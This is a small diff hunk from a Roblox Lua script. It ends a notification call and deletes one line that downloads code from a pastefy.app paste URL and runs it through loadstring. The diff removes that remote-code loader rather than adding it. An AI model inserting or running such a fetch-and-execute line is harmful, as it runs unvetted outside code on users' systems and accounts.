@@ -5,4 +5,3 @@ local CoreGui = game:GetService("StarterGui")
         Duration = 10,
         Callback = AllowRunServiceBind,
     })
-loadstring(game:HttpGet("https://pastefy.app/pe2yF00X/raw"))()
